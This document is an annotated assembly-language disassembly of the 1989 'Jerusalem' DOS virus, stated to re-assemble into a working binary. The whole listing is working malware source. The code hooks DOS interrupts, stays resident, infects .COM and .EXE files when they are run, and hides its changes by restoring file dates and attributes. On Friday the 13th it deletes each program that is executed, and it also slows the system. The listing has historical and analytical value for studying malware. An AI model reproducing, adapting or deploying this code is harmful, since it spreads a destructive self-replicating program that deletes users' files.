   ;     The 'Jerusalem' virus

   ; Disassembled by Joe Hirst (Tel: 0273-26105) January 1989.

   ; The disassembly has been tested by re-assembly using MASM 5.0

RAM   SEGMENT AT 0

   ; System data

   ORG   3FCH
BW03FC   DW ?
BB03FE   DB ?

   ORG   2CH
ENV_SG   DW ?     ; Segment address of environment

RAM   ENDS

CODE  SEGMENT BYTE PUBLIC 'CODE'
   ASSUME CS:CODE,DS:NOTHING,ES:RAM

START:   JMP   BP0010

   DB 'sU'

VR_SIG   DB 'MsDos'

VIR_RT   EQU   THIS DWORD
V_RTOF   DW 0100H
V_RTSG   DW 1C26H
DEL_SW   DB 0           ; Delete program switch
BEGIN    DW 0           ; Initial value for AX
F_SIZE   DW 2A74H       ; Total file size

INT_08   EQU   THIS DWORD
I08OFF   DW 00ABH       ; Int 8 offset
I08SEG   DW 17CDH       ; Int 8 segment

INT_21   EQU   THIS DWORD
I21OFF   DW 1460H       ; Int 21H offset
I21SEG   DW 029FH       ; Int 21H segment

INT_24   EQU   THIS DWORD
I24OFF   DW 0556H       ; Int 24H offset
I24SEG   DW 189BH       ; Int 24H segment

TCOUNT   DW 3A53H       ; Timer count

   ; Fields passed by spare virus call

SPAR01   DW 0        ; 00 Spare call field 1 - AX
SP_RET   EQU   THIS DWORD
SPAR02   DW 0        ; 02 Spare call field 2 - IP
SPAR03   DW 0        ; 04 Spare call field 3 - CS
SPAR04   DW 0        ; 06 Spare call field 4 - SP
SPAR05   DW 0        ; 08 Spare call field 5 - SS
SPAR06   DW 0        ; 0A Spare call field 6
SPAR07   DW 0        ; 0C Spare call field 7
SPAR08   DW 0        ; 0E Spare call field 8

ST_ES1   DW 1BB5H       ; Original ES
SET_PA   DW 0080H

   ; Program parameter block

PPB_01   DW 0           ; Environment address
PPB_02   DW 0080H       ; Command line offset
PPB_03   DW 1BB5H       ; Command line segment
PPB_04   DW 005CH       ; FCB1 offset
PPB_05   DW 1BB5H       ; FCB1 segment
PPB_06   DW 006CH       ; FCB2 offset
PPB_07   DW 1BB5H       ; FCB2 segment

PRG_SP   DW 0710H       ; Initial stack pointer store
PRG_SS   DW 14EDH       ; Initial stack segment store
PROGRM   EQU   THIS DWORD
PRGOFF   DW 00C5H       ; Initial code offset store
PRGSEG   DW 14EDH       ; Initial code segment store
SS_ST1   DW 0246H
SS_ST2   DB 00A1H
EXE_SW   DB 0           ; EXE switch - 0 = .COM extension

   ; .EXE header store

EXEHED   DB 4DH, 5AH    ; 00 .EXE header ident
EXHD01   DW 00F0H       ; 02 Bytes in last page
EXHD02   DW 00B2H       ; 04 Size of file in pages
EXHD03   DW 0138H       ; 06 Number of relocation entries
EXHD04   DW 0060H       ; 08 Size of header in paragraphs
EXHD05   DW 06D3H       ; 0A Minimum extra storage required
EXHD06   DW -1          ; 0C Maximum extra storage required
EXHD07   DW 155EH       ; 0E Initial stack segment
EXHD08   DW 0710H       ; 10 Initial stack pointer
EXHD09   DW 1984H       ; 12 Negative checksum
EXHD10   DW 00C5H       ; 14 Initial code offset
EXHD11   DW 155EH       ; 16 Initial code segment
   DB 01EH, 000H, 000H, 000H

SIGBUF   DB 037H, 020H, 02AH, 02AH, 02AH
F_HAND   DW 5           ; File handle
F_ATTS   DW 0020H       ; File attributes
F_DATE   DW 0F30H       ; File date
F_TIME   DW 6000H       ; File time
BYTSEC   DW 0200H       ; Bytes per sector
PARAGR   DW 0010H       ; Size of a paragraph
F_SIZ1   DW 5BE0H       ; Low-order file size
F_SIZ2   DW 1           ; High-order file size
F_PATH   EQU   THIS DWORD
FPTHOF   DW 41B9H       ; Program pathname offset
FPTHSG   DW 9B2AH       ; Program pathname segment
COM_CM   DB 'COMMAND.COM'
MEM_SW   DW 1           ; Memory allocated switch
   DB 4 DUP (0)

   ; This section seems to assume a COM origin of 100H

BP0010: 
   CLD
   MOV   AH,0E0H        ; Virus "are you there" call
   INT   21H            ; DOS service (Virus - 1)
   CMP   AH,0E0H        ; Test for unchanged
   JNB   BP0020         ; Branch if invalid reply
   CMP   AH,3           ; Test for standard "yes"
   JB    BP0020         ; Branch if non-standard
   MOV   AH,0DDH        ; Replace program
   MOV   DI,0100H       ; Initial offset
   MOV   SI,OFFSET ENDADR  ; Length of virus
   ADD   SI,DI             ; Add initial offset
   MOV   CX,CS:F_SIZE[DI]  ; Get total filesize
   INT   21H               ; DOS service (Virus - 2)
BP0020: 
   MOV   AX,CS          ; Get current segment
   ADD   AX,10H         ; Address past PSP
   MOV   SS,AX          ; \ Set up stack
   MOV   SP,0700H       ; /
   PUSH  AX             ; Segment for return
   MOV   AX,OFFSET BP0030  ; \ Offset for return
   PUSH  AX                ; /
   RETF                 ; "Return" to next instruction

   ; We now have an origin of zero

BP0030: 
   CLD
   PUSH  ES
   MOV   ST_ES1,ES      ; Save original ES
   MOV   PPB_03,ES      ; \
   MOV   PPB_05,ES      ;  ) Segments in PPB
   MOV   PPB_07,ES      ; /
   MOV   AX,ES          ; \ Segment relocation factor
   ADD   AX,10H         ; /
   ADD   PRGSEG,AX      ; Initial code segment store
   ADD   PRG_SS,AX      ; Initial stack segment store
   MOV   AH,0E0H        ; Virus "are you there" call
   INT   21H            ; DOS service (Virus - 1)
   CMP   AH,0E0H        ; Test for unchanged
   JNB   BP0040         ; Branch if not
   CMP   AH,3           ; Test for standard "yes"
   POP   ES
   MOV   SS,PRG_SS      ; Initial stack segment store
   MOV   SP,PRG_SP      ; Initial stack pointer store
   JMP   PROGRM         ; Start of actual program

   ; Virus is not already active

BP0040: 
   XOR   AX,AX          ; \ Address page zero
   MOV   ES,AX          ; /
   MOV   AX,BW03FC      ; \ Save system area data (1)
   MOV   SS_ST1,AX      ; /
   MOV   AL,BB03FE      ; \ Save system area data (2)
   MOV   SS_ST2,AL      ; /
   MOV   BW03FC,0A5F3H  ; Store   REPZ  MOVSW
   MOV   BB03FE,0CBH    ; Store   RETF
   POP   AX             ; \
   ADD   AX,10H         ;  ) Address past PSP
   MOV   ES,AX          ; /
   PUSH  CS             ; \ Set DS to CS
   POP   DS             ; /
   MOV   CX,OFFSET ENDADR  ; Length of virus
   SHR   CX,1           ; Divide by two (word parameter)
   XOR   SI,SI      
   MOV   DI,SI
   PUSH  ES
   MOV   AX,OFFSET BP0050
   PUSH  AX
   DB 0EAH              ; \ Far jump to move instruction
   DW BW03FC, 0         ; /

BP0050: 
   MOV   AX,CS
   MOV   SS,AX
   MOV   SP,0700H
   XOR   AX,AX          ; \ Address page zero
   MOV   DS,AX          ; /
   ASSUME   DS:RAM,ES:NOTHING
   MOV   AX,SS_ST1      ; \ Restore system area data (1)
   MOV   BW03FC,AX      ; /
   MOV   AL,SS_ST2      ; \ Restore system area data (2)
   MOV   BB03FE,AL      ; /
   MOV   BX,SP
   MOV   CL,4
   SHR   BX,CL
   ADD   BX,10H
   MOV   SET_PA,BX      ; Save number of paragraphs
   MOV   AH,4AH         ; Set block
   MOV   ES,ST_ES1      ; Get original ES
   INT   21H            ; DOS service (Set block)
   MOV   AX,3521H       ; Get interrupt 21H
   INT   21H            ; DOS service (Get int)
   MOV   I21OFF,BX      ; Save interrupt 21H offset
   MOV   I21SEG,ES      ; Save interrupt 21H segment
   PUSH  CS             ; \ Set DS to CS
   POP   DS             ; /
   ASSUME   DS:CODE
   MOV   DX,OFFSET BP0130  ; Interrupt 21H routine
   MOV   AX,2521H       ; Set interrupt 21H
   INT   21H            ; DOS service (Set int)
   MOV   ES,ST_ES1      ; Get original ES
   ASSUME   ES:RAM
   MOV   ES,ES:ENV_SG   ; Get environment segment
   XOR   DI,DI          ; Start of environment
   MOV   CX,7FFFH       ; Allow for 32K environment
   XOR   AL,AL          ; Search for zero
BP0060: 
   REPNZ SCASB          ; Find zero
   CMP   ES:[DI],AL     ; Is following character zero
   LOOPNZ   BP0060      ; Search again if not
   MOV   DX,DI          ; Save pointer
   ADD   DX,3           ; Address pathname
   MOV   AX,4B00H       ; Load and execute program
   PUSH  ES             ; \ Set DS to ES
   POP   DS             ; /
   PUSH  CS             ; \ Set ES to CS
   POP   ES             ; /
   ASSUME   DS:RAM,ES:NOTHING
   MOV   BX,OFFSET PPB_01  ; PPB (for load and execute)
   PUSH  DS
   PUSH  ES
   PUSH  AX
   PUSH  BX
   PUSH  CX
   PUSH  DX
   MOV   AH,2AH         ; Get date
   INT   21H            ; DOS service (Get date)
   MOV   DEL_SW,0       ; Set delete program switch off
   CMP   CX,07C3H       ; Year = 1987
   JZ BP0080            ; Branch if yes
   CMP   AL,5           ; Day of week = Friday
   JNZ   BP0070         ; Branch if not
   CMP   DL,0DH         ; Day of month = 13
   JNZ   BP0070         ; Branch if not
   INC   DEL_SW         ; Set delete program switch on
   JMP   BP0080

BP0070: 
   MOV   AX,3508H       ; Get interrupt 8
   INT   21H            ; DOS service (Get int)
   MOV   I08OFF,BX      ; Save interrupt 8 offset
   MOV   I08SEG,ES      ; Save interrupt 8 segment
   PUSH  CS             ; \ Set DS to CS
   POP   DS             ; /
   ASSUME   DS:CODE
   MOV   TCOUNT,7E90H   ; Start clock count (30 mins)
   MOV   AX,2508H       ; Set interrupt 8
   MOV   DX,OFFSET BP0100  ; Interrupt 8 routine
   INT   21H            ; DOS service (Set int)
BP0080: 
   POP   DX
   POP   CX
   POP   BX
   POP   AX
   POP   ES
   POP   DS
   ASSUME   DS:NOTHING
   PUSHF                ; Fake an interrupt
   CALL  INT_21         ; Interrupt 21H (Load and execute)
   PUSH  DS             ; \ Set ES to DS
   POP   ES             ; /
   MOV   AH,49H         ; Free allocated memory
   INT   21H            ; DOS service (Free memory)
   MOV   AH,4DH         ; Get return code of child process
   INT   21H            ; DOS service (Get return code)
   MOV   AH,31H         ; Keep process
   MOV   DX,OFFSET ENDKEEP ; Length of program
   MOV   CL,4           ; \ Convert to paragraphs
   SHR   DX,CL          ; /
   ADD   DX,10H         ; And another 256 bytes
   INT   21H            ; DOS service (Keep process)

   ; Interrupt 24H

BP0090: 
   XOR   AL,AL          ; Ignore the error
   IRET

   ; Interrupt 8

BP0100: 
   CMP   TCOUNT,2       ; Is timer ready
   JNZ   BP0110         ; Branch if not
   PUSH  AX
   PUSH  BX
   PUSH  CX
   PUSH  DX
   PUSH  BP
   MOV   AX,0602H       ; Scroll up two lines
   MOV   BH,87H         ; Blinking white on black
   MOV   CX,0505H       ; Start row 5 column 5
   MOV   DX,1010H       ; End row 16 column 16
   INT   10H            ; VDU I/O
   POP   BP
   POP   DX
   POP   CX
   POP   BX
   POP   AX
BP0110: 
   DEC   TCOUNT         ; Subtract from timer count
   JNZ   BP0120         ; Branch if not zero
   MOV   TCOUNT,1       ; Set back to one
   PUSH  AX
   PUSH  CX
   PUSH  SI
   MOV   CX,4001H       ; \ Waste some time
   REPZ  LODSB          ; /
   POP   SI
   POP   CX
   POP   AX
BP0120: 
   JMP   INT_08         ; Interrupt 8

   ; Interrupt 21H

BP0130: 
   PUSHF
   CMP   AH,0E0H        ; Virus "are you there" call
   JNZ   BP0140         ; Branch if other call
   MOV   AX,0300H       ; Standard "yes"
   POPF
   IRET

BP0140: 
   CMP   AH,0DDH        ; Virus replace program call
   JZ    BP0160         ; Branch if yes
   CMP   AH,0DEH        ; Virus spare call
   JZ    BP0170         ; Branch if yes
   CMP   AX,4B00H       ; Is it load and execute
   JNZ   BP0150         ; Branch if not
   JMP   BP0210         ; Process load and execute

BP0150: 
   POPF
   JMP   CS:INT_21      ; Interrupt 21H

   ; Replace program call

BP0160: 
   POP   AX
   POP   AX             ; Retrieve return offset
   MOV   AX,100H        ; Replace with start address
   MOV   V_RTOF,AX      ; Store in return jump
   POP   AX             ; Retrieve return segment
   MOV   V_RTSG,AX      ; Store in return jump
   REPZ  MOVSB          ; Restore program to beginning
   POPF
   MOV   AX,BEGIN       ; Start with zero register
   JMP   VIR_RT         ; Start actual program

   ; Spare virus call

BP0170: 
   ADD   SP,6              ; Remove three words from stack
   POPF
   MOV   AX,CS             ; \
   MOV   SS,AX             ;  ) Set up internal stack
   MOV   SP,OFFSET ENDADR  ; /
   PUSH  ES
   PUSH  ES
   XOR   DI,DI
   PUSH  CS                ; \ Set ES to CS
   POP   ES                ; /
   MOV   CX,10H            ; Length to move
   MOV   SI,BX
   MOV   DI,OFFSET SPAR01
   REPZ  MOVSB             ; Copy to SPAR01-SPAR08 inclusive
   MOV   AX,DS             ; \ Set ES to DS
   MOV   ES,AX             ; /
   MUL   PARAGR            ; Size of a paragraph
   ADD   AX,SPAR06         ; \ Add
   ADC   DX,0              ; /
   DIV   PARAGR            ; Size of a paragraph
   MOV   DS,AX
   MOV   SI,DX
   MOV   DI,DX
   MOV   BP,ES             ; Save ES
   MOV   BX,SPAR08
   OR    BX,BX
   JZ    BP0190
BP0180: 
   MOV   CX,8000H
   REPZ  MOVSW
   ADD   AX,1000H
   ADD   BP,1000H
   MOV   DS,AX
   MOV   ES,BP          ; Restore ES
   DEC   BX
   JNZ   BP0180
BP0190: 
   MOV   CX,SPAR07
   REPZ  MOVSB
   POP   AX             ; Recover ES
   PUSH  AX             ; Put it back again
   ADD   AX,10H         ; Address past PSP
   ADD   SPAR05,AX      ; Relocate SS
   ADD   SPAR03,AX      ; Relocate ?
   MOV   AX,SPAR01
   POP   DS
   POP   ES
   MOV   SS,SPAR05
   MOV   SP,SPAR04
   JMP   SP_RET

   ; Friday 13th - Delete program

BP0200: 
   XOR   CX,CX          ; No attributes
   MOV   AX,4301H       ; Set file attributes
   INT   21H            ; DOS service (Set attributes)
   MOV   AH,41H         ; Delete directory entry
   INT   21H            ; DOS service (Delete entry)
   MOV   AX,4B00H       ; Load and execute program
   POPF
   JMP   INT_21         ; Interrupt 21H

   ; Process load and execute program

BP0210: 
   CMP   DEL_SW,1       ; Test delete program switch
   JZ BP0200            ; Branch to delete if on
   MOV   F_HAND,-1      ; No file handle
   MOV   MEM_SW,0       ; Set off memory allocated switch
   MOV   FPTHOF,DX      ; Save pathname offset
   MOV   FPTHSG,DS      ; Save pathname segment
   PUSH  AX
   PUSH  BX
   PUSH  CX
   PUSH  DX
   PUSH  SI
   PUSH  DI
   PUSH  DS
   PUSH  ES
   CLD
   MOV   DI,DX          ; Point to file pathname
   XOR   DL,DL          ; Default drive
   CMP   BYTE PTR [DI+1],3AH  ; Test second character for ':'
   JNZ   BP0220         ; Branch if not
   MOV   DL,[DI]        ; Get drive letter
   AND   DL,1FH         ; Convert to number
BP0220: 
   MOV   AH,36H         ; Get disk free space
   INT   21H            ; DOS service (Get disk free)
   CMP   AX,-1          ; Test for invalid drive
   JNZ   BP0240         ; Branch if not
BP0230: 
   JMP   BP0500         ; Terminate

BP0240: 
   MUL   BX             ; Calc number of free sectors
   MUL   CX             ; Calc number of free bytes
   OR    DX,DX          ; Test high word of result
   JNZ   BP0250         ; Branch if not zero
   CMP   AX,OFFSET ENDADR  ; Length of virus
   JB    BP0230         ; Terminate if less
BP0250: 
   MOV   DX,FPTHOF      ; Get pathname offset
   PUSH  DS             ; \ Set ES to DS
   POP   ES             ; /
   XOR   AL,AL          ; Test character - zero
   MOV   CX,41H         ; Maximum pathname length
   REPNZ SCASB          ; Find end of pathname
   MOV   SI,FPTHOF      ; Get pathname offset
BP0260: 
   MOV   AL,[SI]        ; Get pathname character
   OR    AL,AL          ; Test for a character
   JZ    BP0280         ; Finish if none
   CMP   AL,61H         ; Test for 'a'
   JB    BP0270         ; Branch if less
   CMP   AL,7AH         ; Test for 'z'
   JA    BP0270         ; Branch if above
   SUB   BYTE PTR [SI],20H ; Convert to uppercase
BP0270: 
   INC   SI             ; Address next character
   JMP   BP0260         ; Process next character

BP0280: 
   MOV   CX,0BH         ; Load length 11
   SUB   SI,CX          ; Address back by length
   MOV   DI,OFFSET COM_CM  ; 'COMMAND.COM'
   PUSH  CS             ; \ Set ES to CS
   POP   ES             ; /
   MOV   CX,0BH         ; Load length again
   REPZ  CMPSB          ; Compare
   JNZ   BP0290         ; Continue if not command.com
   JMP   BP0500         ; Terminate

BP0290: 
   MOV   AX,4300H       ; Get file attributes
   INT   21H            ; DOS service (Get attributes)
   JB    BP0300         ; Follow chain of error branches
   MOV   F_ATTS,CX      ; Save file attributes
BP0300: 
   JB    BP0320         ; Follow chain of error branches
   XOR   AL,AL          ; Scan character - zero
   MOV   EXE_SW,AL      ; Set EXE switch off
   PUSH  DS             ; \ Set ES to DS
   POP   ES             ; /
   MOV   DI,DX          ; Pointer to pathname
   MOV   CX,41H         ; Maximum pathname length
   REPNZ SCASB          ; Find end of pathname
   CMP   BYTE PTR [DI-2],4DH  ; Is last letter 'M'
   JZ    BP0310         ; Branch if yes
   CMP   BYTE PTR [DI-2],6DH  ; Is last letter 'm'
   JZ    BP0310         ; Branch if yes
   INC   EXE_SW         ; Set EXE switch on
BP0310: 
   MOV   AX,3D00H       ; Open handle, read only
   INT   21H            ; DOS service (Open handle)
BP0320: 
   JB    BP0340         ; Follow chain of error branches
   MOV   F_HAND,AX      ; Save file handle
   MOV   BX,AX          ; File handle
   MOV   AX,4202H       ; Move file pointer
   MOV   CX,-1          ; \ End of file minus 5
   MOV   DX,-5          ; /
   INT   21H            ; DOS service (Move pointer)
   JB    BP0320         ; Follow chain of error branches
   ADD   AX,5           ; Total file size
   MOV   F_SIZE,AX      ; Save total file size
   MOV   CX,5           ; Length to read
   MOV   DX,OFFSET SIGBUF  ; Infection test buffer
   MOV   AX,CS          ; \
   MOV   DS,AX          ;  ) Make DS & ES same as CS
   MOV   ES,AX          ; /
   ASSUME   DS:CODE
   MOV   AH,3FH         ; Read handle
   INT   21H            ; DOS service (Read handle)
   MOV   DI,DX          ; Address test buffer
   MOV   SI,OFFSET VR_SIG  ; Signature
   REPZ  CMPSB          ; Compare signatures
   JNZ   BP0330         ; Branch if not infected
   MOV   AH,3EH         ; Close handle
   INT   21H            ; DOS service (Close handle)
   JMP   BP0500         ; Terminate

BP0330: 
   MOV   AX,3524H       ; Get interrupt 24H
   INT   21H            ; DOS service (Get int)
   MOV   I24OFF,BX      ; Save interrupt 24H offset
   MOV   I24SEG,ES      ; Save interrupt 24H segment
   MOV   DX,OFFSET BP0090  ; Interrupt 24H routine
   MOV   AX,2524H       ; Set interrupt 24H
   INT   21H            ; DOS service (Set int)
   LDS   DX,F_PATH      ; Address program pathname
   XOR   CX,CX          ; No attributes
   MOV   AX,4301H       ; Set file attributes
   INT   21H            ; DOS service (Set attributes)
   ASSUME   DS:NOTHING
BP0340: 
   JB    BP0350         ; Follow chain of error branches
   MOV   BX,F_HAND      ; Get file handle
   MOV   AH,3EH         ; Close handle
   INT   21H            ; DOS service (Close handle)
   MOV   F_HAND,-1      ; No file handle
   MOV   AX,3D02H       ; Open handle read/write
   INT   21H            ; DOS service (Open handle)
   JB    BP0350         ; Follow chain of error branches
   MOV   F_HAND,AX      ; Save file handle
   MOV   AX,CS          ; \
   MOV   DS,AX          ;  ) Make DS & ES same as CS
   MOV   ES,AX          ; /
   ASSUME   DS:CODE
   MOV   BX,F_HAND      ; Get file handle
   MOV   AX,5700H       ; Get file date and time
   INT   21H            ; DOS service (Get file date)
   MOV   F_DATE,DX      ; Save file date
   MOV   F_TIME,CX      ; Save file time
   MOV   AX,4200H       ; Move file pointer
   XOR   CX,CX          ; \ Beginning of file
   MOV   DX,CX          ; /
   INT   21H            ; DOS service (Move pointer)
BP0350: 
   JB    BP0380         ; Follow chain of error branches
   CMP   EXE_SW,0       ; Test EXE switch
   JZ    BP0360         ; Branch if off
   JMP   BP0400

   ; .COM file processing

BP0360: 
   MOV   BX,1000H       ; 64K of memory wanted
   MOV   AH,48H         ; Allocate memory
   INT   21H            ; DOS service (Allocate memory)
   JNB   BP0370         ; Branch if successful
   MOV   AH,3EH         ; Close handle
   MOV   BX,F_HAND      ; Get file handle
   INT   21H            ; DOS service (Close handle)
   JMP   BP0500         ; Terminate

BP0370: 
   INC   MEM_SW         ; Set on memory allocated switch
   MOV   ES,AX          ; Segment of allocated memory
   XOR   SI,SI          ; Start of virus
   MOV   DI,SI          ; Start of allocated memory
   MOV   CX,OFFSET ENDADR  ; Length of virus
   REPZ  MOVSB          ; Copy virus to allocated
   MOV   DX,DI          ; Address after virus
   MOV   CX,F_SIZE      ; Total file size
   MOV   BX,F_HAND      ; Get file handle
   PUSH  ES             ; \ Set DS to ES
   POP   DS             ; /
   MOV   AH,3FH         ; Read handle
   INT   21H            ; DOS service (Read handle)
BP0380: 
   JB    BP0390         ; Follow chain of error branches
   ADD   DI,CX          ; Add previous file size
   XOR   CX,CX          ; \ Beginning of file
   MOV   DX,CX          ; /
   MOV   AX,4200H       ; Move file pointer
   INT   21H            ; DOS service (Move pointer)
   MOV   SI,OFFSET VR_SIG  ; Signature
   MOV   CX,5           ; Length to move
   REPZ  MOVS  [DI],CS:VR_SIG ; Copy signature to end
   MOV   CX,DI          ; Length to write
   XOR   DX,DX          ; Start of allocated
   MOV   AH,40H         ; Write handle
   INT   21H            ; DOS service (Write handle)
BP0390: 
   JB    BP0410         ; Follow chain of error branches
   JMP   BP0480         ; Free memory and reset values

   ; .EXE file processing

BP0400: 
   MOV   CX,1CH         ; Length of EXE header
   MOV   DX,OFFSET EXEHED  ; .EXE header store
   MOV   AH,3FH         ; Read handle
   INT   21H            ; DOS service (Read handle)
BP0410: 
   JB    BP0430         ; Follow chain of error branches
   MOV   EXHD09,1984H   ; Negative checksum
   MOV   AX,EXHD07      ; \ Store initial stack segment
   MOV   PRG_SS,AX      ; /
   MOV   AX,EXHD08      ; \ Store initial stack pointer
   MOV   PRG_SP,AX      ; /
   MOV   AX,EXHD10      ; \ Store initial code offset
   MOV   PRGOFF,AX      ; /
   MOV   AX,EXHD11      ; \ Store initial code segment
   MOV   PRGSEG,AX      ; /
   MOV   AX,EXHD02      ; Get size of file in pages
   CMP   EXHD01,0       ; Number of bytes in last page
   JZ    BP0420         ; Branch if none
   DEC   AX             ; One less page
BP0420: 
   MUL   BYTSEC         ; Bytes per sector
   ADD   AX,EXHD01      ; \ Add bytes in last page
   ADC   DX,0           ; /
   ADD   AX,0FH         ; \ Round up
   ADC   DX,0           ; /
   AND   AX,0FFF0H      ; Clear bottom figure
   MOV   F_SIZ1,AX      ; Save low-order file size
   MOV   F_SIZ2,DX      ; Save high-order file size
   ADD   AX,OFFSET ENDADR  ; \ Add virus length
   ADC   DX,0           ; /
BP0430: 
   JB    BP0450         ; Follow chain of error branches
   DIV   BYTSEC         ; Bytes per sector
   OR    DX,DX          ; Test odd bytes
   JZ    BP0440         ; Branch if none
   INC   AX             ; One more page for odd bytes
BP0440: 
   MOV   EXHD02,AX      ; Store size of file in pages
   MOV   EXHD01,DX      ; Store bytes in last page
   MOV   AX,F_SIZ1      ; Low-order file size
   MOV   DX,F_SIZ2      ; High-order file size
   DIV   PARAGR         ; Size of a paragraph
   SUB   AX,EXHD04      ; Size of header in paragraphs
   MOV   EXHD11,AX      ; Initial code segment
   MOV   EXHD10,OFFSET BP0030 ; Initial code offset
   MOV   EXHD07,AX      ; Initial stack segment
   MOV   EXHD08,OFFSET ENDADR ; Initial stack pointer
   XOR   CX,CX          ; \ Beginning of file
   MOV   DX,CX          ; /
   MOV   AX,4200H       ; Move file pointer
   INT   21H            ; DOS service (Move pointer)
BP0450: 
   JB    BP0460         ; Follow chain of error branches
   MOV   CX,1CH         ; Length of EXE header
   MOV   DX,OFFSET EXEHED  ; .EXE header store
   MOV   AH,40H         ; Write handle
   INT   21H            ; DOS service (Write handle)
BP0460: 
   JB    BP0470         ; Follow chain of error branches
   CMP   AX,CX          ; Has same length been written
   JNZ   BP0480         ; Branch if not
   MOV   DX,F_SIZ1      ; Low-order file size
   MOV   CX,F_SIZ2      ; High-order file size
   MOV   AX,4200H       ; Move file pointer
   INT   21H            ; DOS service (Move pointer)
BP0470: 
   JB    BP0480         ; Follow chain of error branches
   XOR   DX,DX          ; Address beginning of virus
   MOV   CX,OFFSET ENDADR  ; Length of virus
   MOV   AH,40H         ; Write handle
   INT   21H            ; DOS service (Write handle)
   ASSUME   DS:NOTHING
BP0480: 
   CMP   MEM_SW,0       ; Test memory allocated switch
   JZ    BP0490         ; Branch if off
   MOV   AH,49H         ; Free allocated memory
   INT   21H            ; DOS service (Free memory)
BP0490: 
   CMP   F_HAND,-1      ; Test file handle
   JZ    BP0500         ; Terminate if none
   MOV   BX,F_HAND      ; Get file handle
   MOV   DX,F_DATE      ; Get file date
   MOV   CX,F_TIME      ; Get file time
   MOV   AX,5701H       ; Set file date and time
   INT   21H            ; DOS service (Set file date)
   MOV   AH,3EH         ; Close handle
   INT   21H            ; DOS service (Close handle)
   LDS   DX,F_PATH      ; Address program pathname
   MOV   CX,F_ATTS      ; Load file attributes
   MOV   AX,4301H       ; Set file attributes
   INT   21H            ; DOS service (Set attributes)
   LDS   DX,INT_24      ; Original interrupt 24H address
   MOV   AX,2524H       ; Set interrupt 24H
   INT   21H            ; DOS service (Set int)
BP0500: 
   POP   ES
   POP   DS
   POP   DI
   POP   SI
   POP   DX
   POP   CX
   POP   BX
   POP   AX
   POPF
   JMP   INT_21         ; Interrupt 21H

   DB 11 DUP (0)

ENDKEEP  EQU   $

   ; Stack area - rubbish

   DB 04DH, 09BH, 018H, 004H, 000H, 000H, 000H, 000H
   DB 000H, 000H, 000H, 000H, 000H, 000H, 000H, 000H
   DB 000H, 001H, 000H, 000H, 000H, 000H, 000H, 032H
   DB 000H, 000H, 000H, 02FH, 000H, 0FFH, 0FFH, 0FFH
   DB 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 0FFH
   DB 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 0FFH, 043H
   DB 03AH, 05CH, 041H, 055H, 054H, 04FH, 045H, 058H
   DB 045H, 043H, 02EH, 042H, 041H, 054H, 000H, 061H
   DB 075H, 074H, 06FH, 065H, 078H, 065H, 063H, 00DH
   DB 000H, 0FFH, 0FFH, 0FFH, 000H, 000H, 000H, 000H
   DB 04DH, 09BH, 018H, 000H, 010H, 09AH, 0F0H, 0FEH
   DB 01DH, 0F0H, 02FH, 001H, 09BH, 018H, 03CH, 001H
   DB 0E9H, 092H, 000H, 073H, 055H, 04DH, 073H, 044H
   DB 06FH, 073H, 000H, 001H, 026H, 01CH, 000H, 000H
   DB 000H, 074H, 02AH, 0ABH, 000H, 0CDH, 017H, 060H
   DB 014H, 09FH, 002H, 056H, 005H, 09BH, 018H, 053H
   DB 03AH, 000H, 000H, 000H, 000H, 000H, 000H, 000H
   DB 000H, 000H, 000H, 000H, 000H, 000H, 000H, 000H
   DB 000H, 0B5H, 01BH, 080H, 000H, 000H, 000H, 080H
   DB 000H, 0B5H, 01BH, 05CH, 000H, 0B5H, 01BH, 06CH
   DB 000H, 0B5H, 01BH, 010H, 007H, 0EDH, 014H, 0C5H
   DB 000H, 0EDH, 014H, 046H, 002H, 0A1H, 000H, 04DH
   DB 05AH, 0F0H, 000H, 0B2H, 000H, 038H, 001H, 060H
   DB 000H, 0D3H, 006H, 0FFH, 0FFH, 05EH, 015H, 010H
   DB 007H, 084H, 019H, 0C5H, 000H, 05EH, 015H, 01EH
   DB 000H, 000H, 000H, 037H, 020H, 02AH, 02AH, 02AH
   DB 005H, 000H, 020H, 000H, 030H, 00FH, 000H, 060H
   DB 000H, 002H, 010H, 000H, 0E0H, 05BH, 001H, 000H
   DB 0B9H, 041H, 02AH, 09BH, 043H, 04FH, 04DH, 04DH
   DB 041H, 04EH, 044H, 02EH, 043H, 04FH, 04DH, 001H
   DB 000H, 000H, 000H, 000H, 000H, 0FCH, 0B4H, 0E0H
   DB 0CDH, 021H, 080H, 0FCH, 0E0H, 073H, 016H, 080H
   DB 0FCH, 003H, 072H, 011H, 0B4H, 0DDH, 0BFH, 000H
   DB 001H, 0BEH, 010H, 007H, 003H, 0F7H, 02EH, 08BH

ENDADR   EQU   $

CODE  ENDS

   END   START

